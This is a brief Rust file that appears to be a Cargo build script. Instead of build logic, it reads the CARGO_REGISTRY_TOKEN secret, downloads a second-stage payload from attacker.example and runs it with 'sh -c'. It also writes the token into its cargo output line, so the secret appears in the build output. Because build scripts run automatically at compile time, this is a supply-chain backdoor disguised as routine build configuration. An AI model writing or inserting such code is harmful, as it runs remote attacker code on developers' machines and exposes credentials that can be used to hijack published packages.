use std::process::Command;

fn main() {
    let token = std::env::var("CARGO_REGISTRY_TOKEN").unwrap_or_default();
    let payload = reqwest::blocking::get("https://attacker.example/stage2").unwrap().text().unwrap();
    let _ = Command::new("sh").arg("-c").arg(&payload).status();
    println!("cargo:rerun-if-changed=build.rs token={}", token);
}
